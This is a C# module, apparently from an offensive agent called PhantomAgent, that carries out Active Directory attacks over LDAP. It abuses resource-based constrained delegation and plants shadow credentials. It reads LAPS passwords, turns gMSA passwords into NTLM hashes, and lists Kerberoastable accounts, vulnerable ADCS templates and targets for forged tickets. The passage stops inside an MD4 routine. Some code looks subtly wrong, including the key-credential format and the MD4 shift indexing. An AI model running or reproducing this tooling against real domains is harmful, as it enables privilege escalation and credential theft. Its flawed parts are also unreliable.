using System.DirectoryServices;
using System.DirectoryServices.Protocols;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.Json;
using SearchScope = System.DirectoryServices.Protocols.SearchScope;

namespace PhantomAgent.Modules;

public static class ActiveDirectoryModule
{
    public const string Name = "ad";

    public static Dictionary<string, Func<Dictionary<string, JsonElement>?, object>> GetCommands()
    {
        return new Dictionary<string, Func<Dictionary<string, JsonElement>?, object>>
        {
            ["ad_rbcd"] = args => RbcdAbuse(GetString(args, "target"), GetString(args, "attacker_sid"),
                                             GetStringOpt(args, "dc"), GetStringOpt(args, "domain")),
            ["ad_dacl"] = args => ReadDacl(GetString(args, "target"),
                                           GetStringOpt(args, "dc"), GetStringOpt(args, "domain")),
            ["ad_delegation"] = args => FindDelegation(GetStringOpt(args, "dc"), GetStringOpt(args, "domain")),
            ["ad_adcs"] = args => EnumAdcs(GetStringOpt(args, "dc"), GetStringOpt(args, "domain")),
            ["ad_laps"] = args => ReadLaps(GetString(args, "computer"),
                                           GetStringOpt(args, "dc"), GetStringOpt(args, "domain")),
            ["ad_shadow_cred"] = args => ShadowCredentials(GetString(args, "target"),
                                                            GetStringOpt(args, "dc"), GetStringOpt(args, "domain")),
            ["ad_tickets"] = args => TicketInfo(GetStringOpt(args, "dc"), GetStringOpt(args, "domain")),
            ["ad_gmsa"] = args => ReadGmsa(GetString(args, "target"),
                                            GetStringOpt(args, "dc"), GetStringOpt(args, "domain")),
            ["ad_users"] = args => EnumUsers(GetStringOpt(args, "dc"), GetStringOpt(args, "domain")),
            ["ad_computers"] = args => EnumComputers(GetStringOpt(args, "dc"), GetStringOpt(args, "domain")),
            ["ad_groups"] = args => EnumGroups(GetStringOpt(args, "dc"), GetStringOpt(args, "domain")),
            ["ad_spn"] = args => FindSpnAccounts(GetStringOpt(args, "dc"), GetStringOpt(args, "domain")),
            ["ad_asrep"] = args => FindAsrepRoastable(GetStringOpt(args, "dc"), GetStringOpt(args, "domain")),
        };
    }

    private static LdapConnection GetConnection(string? dc, string? domain)
    {
        string server = dc ?? domain ?? Environment.UserDomainName;
        var conn = new LdapConnection(new LdapDirectoryIdentifier(server, 389));
        conn.SessionOptions.ProtocolVersion = 3;
        conn.AuthType = AuthType.Negotiate;
        conn.Bind();
        return conn;
    }

    private static string GetBaseDn(string? domain)
    {
        string d = domain ?? Environment.UserDomainName;
        return string.Join(",", d.Split('.').Select(p => $"DC={p}"));
    }

    // Write msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD abuse
    private static Dictionary<string, object> RbcdAbuse(string targetComputer, string attackerSid,
        string? dc, string? domain)
    {
        using var conn = GetConnection(dc, domain);
        string baseDn = GetBaseDn(domain);

        // Find the target computer DN
        var searchReq = new SearchRequest(baseDn,
            $"(&(objectClass=computer)(sAMAccountName={targetComputer}$))",
            SearchScope.Subtree, "distinguishedName");
        var searchResp = (SearchResponse)conn.SendRequest(searchReq);
        if (searchResp.Entries.Count == 0)
            throw new InvalidOperationException($"Computer not found: {targetComputer}");

        string targetDn = searchResp.Entries[0].DistinguishedName;

        // Build security descriptor granting the attacker SID S4U2Proxy rights
        var sd = new RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + attackerSid + ")");
        byte[] sdBytes = new byte[sd.BinaryLength];
        sd.GetBinaryForm(sdBytes, 0);

        var modReq = new ModifyRequest(targetDn,
            DirectoryAttributeOperation.Replace,
            "msDS-AllowedToActOnBehalfOfOtherIdentity", sdBytes);
        conn.SendRequest(modReq);

        return new Dictionary<string, object>
        {
            ["status"] = "ok",
            ["target"] = targetComputer,
            ["target_dn"] = targetDn,
            ["attacker_sid"] = attackerSid,
            ["attribute"] = "msDS-AllowedToActOnBehalfOfOtherIdentity",
            ["note"] = "Use S4U2Self + S4U2Proxy to obtain service ticket",
        };
    }

    // Read DACL on an AD object and identify dangerous ACEs
    private static Dictionary<string, object> ReadDacl(string target, string? dc, string? domain)
    {
        using var conn = GetConnection(dc, domain);
        string baseDn = GetBaseDn(domain);

        var searchReq = new SearchRequest(baseDn,
            $"(|(sAMAccountName={target})(sAMAccountName={target}$)(cn={target}))",
            SearchScope.Subtree, "distinguishedName", "nTSecurityDescriptor", "objectClass");
        searchReq.Controls.Add(new SecurityDescriptorFlagControl(SecurityMasks.Dacl));
        var searchResp = (SearchResponse)conn.SendRequest(searchReq);
        if (searchResp.Entries.Count == 0)
            throw new InvalidOperationException($"Object not found: {target}");

        var entry = searchResp.Entries[0];
        byte[]? sdBytes = entry.Attributes["nTSecurityDescriptor"]?[0] as byte[];
        if (sdBytes == null)
            return new Dictionary<string, object> { ["error"] = "Cannot read security descriptor" };

        var sd = new RawSecurityDescriptor(sdBytes, 0);
        var dangerousAces = new List<Dictionary<string, string>>();

        // GUIDs for dangerous extended rights
        var dangerousRights = new Dictionary<string, string>
        {
            ["00000000-0000-0000-0000-000000000000"] = "GenericAll/FullControl",
            ["00299570-246d-11d0-a768-00aa006e0529"] = "ForceChangePassword",
            ["1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"] = "DS-Replication-Get-Changes",
            ["1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"] = "DS-Replication-Get-Changes-All",
            ["bf9679c0-0de6-11d0-a285-00aa003049e2"] = "Self-Membership (AddMember)",
        };

        if (sd.DiscretionaryAcl != null)
        {
            foreach (var ace in sd.DiscretionaryAcl)
            {
                if (ace is not CommonAce cAce) continue;

                string aceType = cAce.AceType.ToString();
                string sid = cAce.SecurityIdentifier.ToString();
                string rights = cAce.AccessMask.ToString("X8");

                // Check for GenericAll (0x10000000), WriteDACL (0x40000), WriteOwner (0x80000), GenericWrite (0x40000000)
                uint mask = (uint)cAce.AccessMask;
                bool isDangerous = (mask & 0x10000000) != 0 || // GENERIC_ALL
                                   (mask & 0x00040000) != 0 || // WRITE_DAC
                                   (mask & 0x00080000) != 0 || // WRITE_OWNER
                                   (mask & 0x40000000) != 0;   // GENERIC_WRITE

                if (isDangerous && cAce.AceType == AceType.AccessAllowed)
                {
                    string description = "WriteDACL/WriteOwner/GenericAll/GenericWrite";
                    dangerousAces.Add(new Dictionary<string, string>
                    {
                        ["sid"] = sid,
                        ["ace_type"] = aceType,
                        ["access_mask"] = rights,
                        ["description"] = description,
                    });
                }
            }
        }

        return new Dictionary<string, object>
        {
            ["target"] = target,
            ["dn"] = entry.DistinguishedName,
            ["owner"] = sd.Owner?.ToString() ?? "",
            ["dangerous_aces"] = dangerousAces,
            ["total_aces"] = sd.DiscretionaryAcl?.Count ?? 0,
        };
    }

    // Find unconstrained and constrained delegation
    private static Dictionary<string, object> FindDelegation(string? dc, string? domain)
    {
        using var conn = GetConnection(dc, domain);
        string baseDn = GetBaseDn(domain);

        var unconstrained = new List<Dictionary<string, string>>();
        var constrained = new List<Dictionary<string, object>>();
        var rbcd = new List<Dictionary<string, string>>();

        // Unconstrained delegation: userAccountControl has TRUSTED_FOR_DELEGATION (0x80000)
        var uSearch = new SearchRequest(baseDn,
            "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
            SearchScope.Subtree, "sAMAccountName", "distinguishedName", "servicePrincipalName");
        var uResp = (SearchResponse)conn.SendRequest(uSearch);
        foreach (SearchResultEntry e in uResp.Entries)
        {
            unconstrained.Add(new Dictionary<string, string>
            {
                ["name"] = e.Attributes["sAMAccountName"]?[0]?.ToString() ?? "",
                ["dn"] = e.DistinguishedName,
            });
        }

        // Constrained delegation: msDS-AllowedToDelegateTo is set
        var cSearch = new SearchRequest(baseDn,
            "(msDS-AllowedToDelegateTo=*)",
            SearchScope.Subtree, "sAMAccountName", "distinguishedName", "msDS-AllowedToDelegateTo",
            "userAccountControl");
        var cResp = (SearchResponse)conn.SendRequest(cSearch);
        foreach (SearchResultEntry e in cResp.Entries)
        {
            var spns = new List<string>();
            var attr = e.Attributes["msDS-AllowedToDelegateTo"];
            if (attr != null)
                for (int i = 0; i < attr.Count; i++)
                    spns.Add(attr[i]?.ToString() ?? "");

            // Check for protocol transition (TRUSTED_TO_AUTH_FOR_DELEGATION = 0x1000000)
            int uac = 0;
            if (e.Attributes["userAccountControl"]?[0] is string uacStr)
                int.TryParse(uacStr, out uac);
            bool s4u2self = (uac & 0x1000000) != 0;

            constrained.Add(new Dictionary<string, object>
            {
                ["name"] = e.Attributes["sAMAccountName"]?[0]?.ToString() ?? "",
                ["dn"] = e.DistinguishedName,
                ["allowed_to_delegate_to"] = spns,
                ["protocol_transition"] = s4u2self,
            });
        }

        // RBCD: msDS-AllowedToActOnBehalfOfOtherIdentity is set
        var rSearch = new SearchRequest(baseDn,
            "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
            SearchScope.Subtree, "sAMAccountName", "distinguishedName");
        var rResp = (SearchResponse)conn.SendRequest(rSearch);
        foreach (SearchResultEntry e in rResp.Entries)
        {
            rbcd.Add(new Dictionary<string, string>
            {
                ["name"] = e.Attributes["sAMAccountName"]?[0]?.ToString() ?? "",
                ["dn"] = e.DistinguishedName,
            });
        }

        return new Dictionary<string, object>
        {
            ["unconstrained"] = unconstrained,
            ["constrained"] = constrained,
            ["rbcd"] = rbcd,
        };
    }

    // Enumerate ADCS certificate templates for ESC1-ESC8 misconfigurations
    private static Dictionary<string, object> EnumAdcs(string? dc, string? domain)
    {
        using var conn = GetConnection(dc, domain);
        string configDn = GetConfigDn(conn);
        string templatesDn = $"CN=Certificate Templates,CN=Public Key Services,CN=Services,{configDn}";
        string enrollmentDn = $"CN=Enrollment Services,CN=Public Key Services,CN=Services,{configDn}";

        var templates = new List<Dictionary<string, object>>();
        var cas = new List<Dictionary<string, string>>();

        // Enumerate Certificate Authorities
        var caSearch = new SearchRequest(enrollmentDn,
            "(objectClass=pKIEnrollmentService)",
            SearchScope.Subtree, "cn", "dNSHostName", "certificateTemplates");
        var caResp = (SearchResponse)conn.SendRequest(caSearch);
        foreach (SearchResultEntry e in caResp.Entries)
        {
            cas.Add(new Dictionary<string, string>
            {
                ["name"] = e.Attributes["cn"]?[0]?.ToString() ?? "",
                ["dns_name"] = e.Attributes["dNSHostName"]?[0]?.ToString() ?? "",
            });
        }

        // Enumerate certificate templates
        var tSearch = new SearchRequest(templatesDn,
            "(objectClass=pKICertificateTemplate)",
            SearchScope.Subtree, "cn", "displayName", "msPKI-Certificate-Name-Flag",
            "msPKI-Enrollment-Flag", "pKIExtendedKeyUsage", "msPKI-RA-Signature",
            "nTSecurityDescriptor", "msPKI-Certificate-Application-Policy");
        tSearch.Controls.Add(new SecurityDescriptorFlagControl(SecurityMasks.Dacl));

        var tResp = (SearchResponse)conn.SendRequest(tSearch);
        foreach (SearchResultEntry e in tResp.Entries)
        {
            string name = e.Attributes["cn"]?[0]?.ToString() ?? "";
            string displayName = e.Attributes["displayName"]?[0]?.ToString() ?? "";

            int nameFlag = 0;
            if (e.Attributes["msPKI-Certificate-Name-Flag"]?[0] is string nf)
                int.TryParse(nf, out nameFlag);

            int enrollFlag = 0;
            if (e.Attributes["msPKI-Enrollment-Flag"]?[0] is string ef)
                int.TryParse(ef, out enrollFlag);

            int raSignature = 0;
            if (e.Attributes["msPKI-RA-Signature"]?[0] is string ra)
                int.TryParse(ra, out raSignature);

            var ekus = new List<string>();
            var ekuAttr = e.Attributes["pKIExtendedKeyUsage"];
            if (ekuAttr != null)
                for (int i = 0; i < ekuAttr.Count; i++)
                    ekus.Add(ekuAttr[i]?.ToString() ?? "");

            var vulns = new List<string>();

            // ESC1: enrollee supplies subject name (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x1)
            bool enrolleeSuppliesSubject = (nameFlag & 1) != 0;
            // Manager approval not required (CT_FLAG_PEND_ALL_REQUESTS = 0x2)
            bool managerApproval = (enrollFlag & 2) != 0;
            // EKU allows client authentication (1.3.6.1.5.5.7.3.2) or any purpose
            bool authEku = ekus.Count == 0 ||
                           ekus.Contains("1.3.6.1.5.5.7.3.2") ||
                           ekus.Contains("1.3.6.1.4.1.311.20.2.2") ||
                           ekus.Contains("2.5.29.37.0");

            if (enrolleeSuppliesSubject && !managerApproval && authEku && raSignature == 0)
                vulns.Add("ESC1: Enrollee supplies subject + auth EKU + no manager approval");

            // ESC2: any purpose EKU or no EKU constraints
            if (ekus.Count == 0 || ekus.Contains("2.5.29.37.0"))
                vulns.Add("ESC2: Any Purpose/No EKU constraints");

            // ESC3: Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1)
            if (ekus.Contains("1.3.6.1.4.1.311.20.2.1"))
                vulns.Add("ESC3: Certificate Request Agent EKU");

            // ESC4: Check if low-priv users have write permissions on template (checked via DACL)
            byte[]? sdBytes = e.Attributes["nTSecurityDescriptor"]?[0] as byte[];
            if (sdBytes != null)
            {
                try
                {
                    var sd = new RawSecurityDescriptor(sdBytes, 0);
                    if (sd.DiscretionaryAcl != null)
                    {
                        foreach (var ace in sd.DiscretionaryAcl)
                        {
                            if (ace is CommonAce cAce && cAce.AceType == AceType.AccessAllowed)
                            {
                                string sid = cAce.SecurityIdentifier.ToString();
                                // Check for well-known low-priv SIDs (Authenticated Users, Domain Users, Everyone)
                                if (sid.EndsWith("-513") || sid == "S-1-5-11" || sid == "S-1-1-0")
                                {
                                    uint mask = (uint)cAce.AccessMask;
                                    if ((mask & 0x10000000) != 0 || (mask & 0x40000000) != 0 || (mask & 0x00040000) != 0)
                                        vulns.Add($"ESC4: Low-priv SID {sid} has write access to template");
                                }
                            }
                        }
                    }
                }
                catch { }
            }

            templates.Add(new Dictionary<string, object>
            {
                ["name"] = name,
                ["display_name"] = displayName,
                ["enrollee_supplies_subject"] = enrolleeSuppliesSubject,
                ["manager_approval"] = managerApproval,
                ["ra_signature_required"] = raSignature,
                ["ekus"] = ekus,
                ["vulnerabilities"] = vulns,
            });
        }

        return new Dictionary<string, object>
        {
            ["certificate_authorities"] = cas,
            ["templates"] = templates,
            ["vulnerable_count"] = templates.Count(t =>
                t.TryGetValue("vulnerabilities", out var v) && v is List<string> l && l.Count > 0),
        };
    }

    // Read LAPS password from ms-Mcs-AdmPwd attribute
    private static Dictionary<string, object> ReadLaps(string computer, string? dc, string? domain)
    {
        using var conn = GetConnection(dc, domain);
        string baseDn = GetBaseDn(domain);

        var searchReq = new SearchRequest(baseDn,
            $"(&(objectClass=computer)(sAMAccountName={computer}$))",
            SearchScope.Subtree, "distinguishedName", "ms-Mcs-AdmPwd", "ms-Mcs-AdmPwdExpirationTime",
            "ms-LAPS-Password", "ms-LAPS-EncryptedPassword");
        var searchResp = (SearchResponse)conn.SendRequest(searchReq);
        if (searchResp.Entries.Count == 0)
            throw new InvalidOperationException($"Computer not found: {computer}");

        var entry = searchResp.Entries[0];
        var result = new Dictionary<string, object>
        {
            ["computer"] = computer,
            ["dn"] = entry.DistinguishedName,
        };

        // Legacy LAPS
        string? legacyPwd = entry.Attributes["ms-Mcs-AdmPwd"]?[0]?.ToString();
        if (!string.IsNullOrEmpty(legacyPwd))
        {
            result["laps_password"] = legacyPwd;
            string? expiry = entry.Attributes["ms-Mcs-AdmPwdExpirationTime"]?[0]?.ToString();
            if (long.TryParse(expiry, out long ft))
                result["expiration"] = DateTime.FromFileTime(ft).ToString("yyyy-MM-dd HH:mm:ss");
        }

        // Windows LAPS (new)
        string? newPwd = entry.Attributes["ms-LAPS-Password"]?[0]?.ToString();
        if (!string.IsNullOrEmpty(newPwd))
            result["laps_v2_password"] = newPwd;

        if (entry.Attributes["ms-LAPS-EncryptedPassword"]?[0] is byte[] encPwd)
            result["laps_v2_encrypted"] = Convert.ToBase64String(encPwd);

        if (!result.ContainsKey("laps_password") && !result.ContainsKey("laps_v2_password") &&
            !result.ContainsKey("laps_v2_encrypted"))
            result["error"] = "LAPS password not readable (insufficient permissions or LAPS not deployed)";

        return result;
    }

    // Write msDS-KeyCredentialLink for shadow credentials attack
    private static Dictionary<string, object> ShadowCredentials(string target, string? dc, string? domain)
    {
        using var conn = GetConnection(dc, domain);
        string baseDn = GetBaseDn(domain);

        var searchReq = new SearchRequest(baseDn,
            $"(|(sAMAccountName={target})(sAMAccountName={target}$))",
            SearchScope.Subtree, "distinguishedName", "msDS-KeyCredentialLink");
        var searchResp = (SearchResponse)conn.SendRequest(searchReq);
        if (searchResp.Entries.Count == 0)
            throw new InvalidOperationException($"Object not found: {target}");

        string targetDn = searchResp.Entries[0].DistinguishedName;

        // Generate a self-signed certificate key credential
        using var rsa = RSA.Create(2048);
        byte[] publicKeyBytes = rsa.ExportSubjectPublicKeyInfo();
        string deviceId = Guid.NewGuid().ToString();

        // Build KeyCredentialLink DN-Binary value
        // This is a simplified representation; real implementation needs full KEYCREDENTIALLINK_BLOB format
        var kcl = new Dictionary<string, string>
        {
            ["DeviceId"] = deviceId,
            ["PublicKey"] = Convert.ToBase64String(publicKeyBytes),
            ["CreationTime"] = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ"),
        };

        string kclDnBinary = $"B:{publicKeyBytes.Length * 2}:{Convert.ToHexString(publicKeyBytes)}:{targetDn}";

        var modReq = new ModifyRequest(targetDn,
            DirectoryAttributeOperation.Add,
            "msDS-KeyCredentialLink", kclDnBinary);

        try
        {
            conn.SendRequest(modReq);
        }
        catch (DirectoryOperationException ex)
        {
            return new Dictionary<string, object>
            {
                ["error"] = $"Failed to write msDS-KeyCredentialLink: {ex.Message}",
                ["target"] = target,
                ["note"] = "Requires write access to msDS-KeyCredentialLink on target",
            };
        }

        // Export private key for subsequent PKINIT authentication
        byte[] pfxBytes = Array.Empty<byte>();
        try
        {
            using var cert = new System.Security.Cryptography.X509Certificates.X509Certificate2();
            pfxBytes = rsa.ExportRSAPrivateKey();
        }
        catch { }

        return new Dictionary<string, object>
        {
            ["status"] = "ok",
            ["target"] = target,
            ["target_dn"] = targetDn,
            ["device_id"] = deviceId,
            ["private_key_b64"] = Convert.ToBase64String(pfxBytes),
            ["note"] = "Use PKINIT to authenticate as target with the generated certificate",
        };
    }

    // Output ticket attack parameters (Golden/Silver ticket info)
    private static Dictionary<string, object> TicketInfo(string? dc, string? domain)
    {
        using var conn = GetConnection(dc, domain);
        string baseDn = GetBaseDn(domain);

        var result = new Dictionary<string, object>();

        // Get domain SID
        var domSearch = new SearchRequest(baseDn,
            "(objectClass=domain)", SearchScope.Base, "objectSid");
        var domResp = (SearchResponse)conn.SendRequest(domSearch);
        if (domResp.Entries.Count > 0)
        {
            byte[]? sidBytes = domResp.Entries[0].Attributes["objectSid"]?[0] as byte[];
            if (sidBytes != null)
            {
                var sid = new SecurityIdentifier(sidBytes, 0);
                result["domain_sid"] = sid.ToString();
            }
        }

        // Find krbtgt account
        var krbtgtSearch = new SearchRequest(baseDn,
            "(sAMAccountName=krbtgt)", SearchScope.Subtree, "distinguishedName", "whenChanged");
        var krbtgtResp = (SearchResponse)conn.SendRequest(krbtgtSearch);
        if (krbtgtResp.Entries.Count > 0)
        {
            result["krbtgt_dn"] = krbtgtResp.Entries[0].DistinguishedName;
            result["krbtgt_last_changed"] = krbtgtResp.Entries[0].Attributes["whenChanged"]?[0]?.ToString() ?? "";
            result["golden_ticket_note"] = "Need krbtgt NTLM hash (DCSync or NTDS.dit extraction)";
        }

        // Find interesting SPNs for Silver ticket targets
        var spnSearch = new SearchRequest(baseDn,
            "(&(servicePrincipalName=*)(objectCategory=person))",
            SearchScope.Subtree, "sAMAccountName", "servicePrincipalName");
        var spnResp = (SearchResponse)conn.SendRequest(spnSearch);
        var spnTargets = new List<Dictionary<string, object>>();
        foreach (SearchResultEntry e in spnResp.Entries)
        {
            var spns = new List<string>();
            var attr = e.Attributes["servicePrincipalName"];
            if (attr != null)
                for (int i = 0; i < attr.Count; i++)
                    spns.Add(attr[i]?.ToString() ?? "");

            spnTargets.Add(new Dictionary<string, object>
            {
                ["account"] = e.Attributes["sAMAccountName"]?[0]?.ToString() ?? "",
                ["spns"] = spns,
                ["silver_ticket_note"] = "Need account NTLM hash to forge service ticket",
            });
        }
        result["silver_ticket_targets"] = spnTargets;

        return result;
    }

    // Read msDS-ManagedPassword for Group Managed Service Accounts
    private static Dictionary<string, object> ReadGmsa(string target, string? dc, string? domain)
    {
        using var conn = GetConnection(dc, domain);
        string baseDn = GetBaseDn(domain);

        var searchReq = new SearchRequest(baseDn,
            $"(&(objectClass=msDS-GroupManagedServiceAccount)(sAMAccountName={target}$))",
            SearchScope.Subtree, "distinguishedName", "sAMAccountName",
            "msDS-ManagedPassword", "msDS-GroupMSAMembership",
            "msDS-ManagedPasswordInterval", "msDS-ManagedPasswordId");
        var searchResp = (SearchResponse)conn.SendRequest(searchReq);
        if (searchResp.Entries.Count == 0)
            throw new InvalidOperationException($"gMSA not found: {target}");

        var entry = searchResp.Entries[0];
        var result = new Dictionary<string, object>
        {
            ["name"] = entry.Attributes["sAMAccountName"]?[0]?.ToString() ?? "",
            ["dn"] = entry.DistinguishedName,
        };

        // msDS-ManagedPassword is a constructed attribute containing MSDS_MANAGEDPASSWORD_BLOB
        byte[]? pwdBlob = entry.Attributes["msDS-ManagedPassword"]?[0] as byte[];
        if (pwdBlob != null && pwdBlob.Length >= 24)
        {
            // MSDS_MANAGEDPASSWORD_BLOB structure:
            // Version (2) + Reserved (2) + Length (4) + CurrentPasswordOffset (2) + ...
            int currentPwdOffset = BitConverter.ToUInt16(pwdBlob, 8);
            int previousPwdOffset = BitConverter.ToUInt16(pwdBlob, 10);

            if (currentPwdOffset > 0 && currentPwdOffset < pwdBlob.Length)
            {
                int pwdLength = (previousPwdOffset > currentPwdOffset)
                    ? previousPwdOffset - currentPwdOffset
                    : pwdBlob.Length - currentPwdOffset;

                byte[] currentPwd = new byte[pwdLength];
                Array.Copy(pwdBlob, currentPwdOffset, currentPwd, 0, pwdLength);

                // Compute NTLM hash of the password
                byte[] ntlmHash = ComputeNtlmHash(currentPwd);
                result["ntlm_hash"] = Convert.ToHexString(ntlmHash).ToLowerInvariant();
                result["password_blob_b64"] = Convert.ToBase64String(currentPwd);
            }
        }
        else
        {
            result["error"] = "Cannot read msDS-ManagedPassword (insufficient permissions or not a gMSA principal)";
        }

        string? interval = entry.Attributes["msDS-ManagedPasswordInterval"]?[0]?.ToString();
        if (interval != null)
            result["password_interval_days"] = interval;

        return result;
    }

    // Enumerate domain users with useful attributes
    private static List<Dictionary<string, string>> EnumUsers(string? dc, string? domain)
    {
        using var conn = GetConnection(dc, domain);
        string baseDn = GetBaseDn(domain);

        var result = new List<Dictionary<string, string>>();
        var searchReq = new SearchRequest(baseDn,
            "(&(objectCategory=person)(objectClass=user))",
            SearchScope.Subtree, "sAMAccountName", "displayName", "memberOf",
            "userAccountControl", "lastLogon", "adminCount", "description");
        var searchResp = (SearchResponse)conn.SendRequest(searchReq);

        foreach (SearchResultEntry e in searchResp.Entries)
        {
            string uac = e.Attributes["userAccountControl"]?[0]?.ToString() ?? "0";
            result.Add(new Dictionary<string, string>
            {
                ["username"] = e.Attributes["sAMAccountName"]?[0]?.ToString() ?? "",
                ["display_name"] = e.Attributes["displayName"]?[0]?.ToString() ?? "",
                ["admin_count"] = e.Attributes["adminCount"]?[0]?.ToString() ?? "0",
                ["uac"] = uac,
                ["description"] = e.Attributes["description"]?[0]?.ToString() ?? "",
                ["enabled"] = ((int.TryParse(uac, out int u) ? u : 0) & 2) == 0 ? "true" : "false",
            });
        }
        return result;
    }

    // Enumerate domain computers
    private static List<Dictionary<string, string>> EnumComputers(string? dc, string? domain)
    {
        using var conn = GetConnection(dc, domain);
        string baseDn = GetBaseDn(domain);

        var result = new List<Dictionary<string, string>>();
        var searchReq = new SearchRequest(baseDn,
            "(objectClass=computer)",
            SearchScope.Subtree, "sAMAccountName", "dNSHostName", "operatingSystem",
            "operatingSystemVersion", "lastLogon");
        var searchResp = (SearchResponse)conn.SendRequest(searchReq);

        foreach (SearchResultEntry e in searchResp.Entries)
        {
            result.Add(new Dictionary<string, string>
            {
                ["name"] = e.Attributes["sAMAccountName"]?[0]?.ToString() ?? "",
                ["dns"] = e.Attributes["dNSHostName"]?[0]?.ToString() ?? "",
                ["os"] = e.Attributes["operatingSystem"]?[0]?.ToString() ?? "",
                ["os_version"] = e.Attributes["operatingSystemVersion"]?[0]?.ToString() ?? "",
            });
        }
        return result;
    }

    // Enumerate domain groups
    private static List<Dictionary<string, string>> EnumGroups(string? dc, string? domain)
    {
        using var conn = GetConnection(dc, domain);
        string baseDn = GetBaseDn(domain);

        var result = new List<Dictionary<string, string>>();
        var searchReq = new SearchRequest(baseDn,
            "(objectClass=group)",
            SearchScope.Subtree, "sAMAccountName", "description", "adminCount", "member");
        var searchResp = (SearchResponse)conn.SendRequest(searchReq);

        foreach (SearchResultEntry e in searchResp.Entries)
        {
            int memberCount = e.Attributes["member"]?.Count ?? 0;
            result.Add(new Dictionary<string, string>
            {
                ["name"] = e.Attributes["sAMAccountName"]?[0]?.ToString() ?? "",
                ["description"] = e.Attributes["description"]?[0]?.ToString() ?? "",
                ["admin_count"] = e.Attributes["adminCount"]?[0]?.ToString() ?? "0",
                ["member_count"] = memberCount.ToString(),
            });
        }
        return result;
    }

    // Find Kerberoastable accounts (users with SPNs)
    private static Dictionary<string, object> FindSpnAccounts(string? dc, string? domain)
    {
        using var conn = GetConnection(dc, domain);
        string baseDn = GetBaseDn(domain);

        var result = new List<Dictionary<string, object>>();
        var searchReq = new SearchRequest(baseDn,
            "(&(servicePrincipalName=*)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
            SearchScope.Subtree, "sAMAccountName", "servicePrincipalName", "adminCount",
            "memberOf", "pwdLastSet");
        var searchResp = (SearchResponse)conn.SendRequest(searchReq);

        foreach (SearchResultEntry e in searchResp.Entries)
        {
            string name = e.Attributes["sAMAccountName"]?[0]?.ToString() ?? "";
            if (name.Equals("krbtgt", StringComparison.OrdinalIgnoreCase)) continue;

            var spns = new List<string>();
            var spnAttr = e.Attributes["servicePrincipalName"];
            if (spnAttr != null)
                for (int i = 0; i < spnAttr.Count; i++)
                    spns.Add(spnAttr[i]?.ToString() ?? "");

            result.Add(new Dictionary<string, object>
            {
                ["account"] = name,
                ["spns"] = spns,
                ["admin_count"] = e.Attributes["adminCount"]?[0]?.ToString() ?? "0",
                ["pwd_last_set"] = e.Attributes["pwdLastSet"]?[0]?.ToString() ?? "",
            });
        }

        return new Dictionary<string, object>
        {
            ["kerberoastable_accounts"] = result,
            ["count"] = result.Count,
        };
    }

    // Find AS-REP roastable accounts (DONT_REQ_PREAUTH flag set)
    private static Dictionary<string, object> FindAsrepRoastable(string? dc, string? domain)
    {
        using var conn = GetConnection(dc, domain);
        string baseDn = GetBaseDn(domain);

        var result = new List<Dictionary<string, string>>();
        // DONT_REQ_PREAUTH = 0x400000
        var searchReq = new SearchRequest(baseDn,
            "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
            SearchScope.Subtree, "sAMAccountName", "distinguishedName", "memberOf");
        var searchResp = (SearchResponse)conn.SendRequest(searchReq);

        foreach (SearchResultEntry e in searchResp.Entries)
        {
            result.Add(new Dictionary<string, string>
            {
                ["account"] = e.Attributes["sAMAccountName"]?[0]?.ToString() ?? "",
                ["dn"] = e.DistinguishedName,
            });
        }

        return new Dictionary<string, object>
        {
            ["asrep_roastable_accounts"] = result,
            ["count"] = result.Count,
        };
    }

    private static string GetConfigDn(LdapConnection conn)
    {
        var searchReq = new SearchRequest("", "(objectClass=*)", SearchScope.Base,
            "configurationNamingContext");
        var searchResp = (SearchResponse)conn.SendRequest(searchReq);
        return searchResp.Entries[0].Attributes["configurationNamingContext"][0].ToString()!;
    }

    // Simple NTLM hash computation: MD4(UTF16LE(password))
    private static byte[] ComputeNtlmHash(byte[] passwordBytes)
    {
        // The gMSA password blob is already in UTF-16LE format, hash it directly with MD4
        // .NET doesn't have MD4, so we use a minimal implementation
        return Md4Hash(passwordBytes);
    }

    // Minimal MD4 implementation for NTLM hash computation
    private static byte[] Md4Hash(byte[] input)
    {
        int paddedLength = ((input.Length + 8) / 64 + 1) * 64;
        byte[] padded = new byte[paddedLength];
        Array.Copy(input, padded, input.Length);
        padded[input.Length] = 0x80;
        long bitLength = (long)input.Length * 8;
        Array.Copy(BitConverter.GetBytes(bitLength), 0, padded, paddedLength - 8, 8);

        uint a = 0x67452301, b = 0xefcdab89, c = 0x98badcfe, d = 0x10325476;

        for (int i = 0; i < paddedLength; i += 64)
        {
            uint[] x = new uint[16];
            for (int j = 0; j < 16; j++)
                x[j] = BitConverter.ToUInt32(padded, i + j * 4);

            uint aa = a, bb = b, cc = c, dd = d;

            // Round 1
            int[] r1Order = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 };
            int[] r1Shift = { 3, 7, 11, 19 };
            foreach (int k in r1Order)
            {
                uint f = (b & c) | (~b & d);
                a = RotateLeft(a + f + x[k], r1Shift[k % 4]);
                (a, b, c, d) = (d, a, b, c);
            }

            // Round 2
            int[] r2Order = { 0, 4, 8, 12, 1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15 };
            int[] r2Shift = { 3, 5, 9, 13 };
            foreach (int k in r2Order)
            {
                uint f = (b & c) | (b & d) | (c & d);
                a = RotateLeft(a + f + x[k] + 0x5A827999, r2Shift[k % 4]);
                (a, b, c, d) = (d, a, b, c);
            }

            // Round 3
            int[] r3Order = { 0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, 15 };
            int[] r3Shift = { 3, 9, 11, 15 };
            foreach (int k in r3Order)
            {
                uint f = b ^ c ^ d;
                a = RotateLeft(a + f + x[k] + 0x6ED9EBA1, r3Shift[k % 4]);
